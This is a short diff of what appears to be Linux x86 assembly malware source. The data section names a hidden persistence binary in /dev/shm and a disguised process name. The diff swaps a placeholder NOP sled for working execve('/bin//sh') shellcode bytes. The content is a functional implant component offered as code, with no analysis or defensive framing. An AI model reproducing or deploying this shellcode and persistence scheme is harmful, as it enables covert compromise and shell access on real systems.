@@ -21,7 +21,7 @@ section .data
     hidden_binary_path db "/dev/shm/.hidden_binary", 0  ; Path to hidden binary for persistence
     hidden_name db "hidden_process_name", 0  ; Name of the hidden process
     len_hidden_name equ $ - hidden_name  ; Length of the hidden process name
-    shellcode db 0x90, 0x90, 0x90, 0x90, 0x90  ; Example NOP sled or shellcode
+    shellcode db 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x99, 0xb0, 0x0b, 0xcd, 0x80
     shellcode_size equ $ - shellcode  ; Size of the shellcode
     
 
@@ -227,11 +227,3 @@ exit:
     mov al, SYS_EXIT
     xor ebx, ebx                ; Exit status 0 (successful exit)
     int 0x80                    ; Make the system call to exit
-   
-
-
-
-
-
-
-
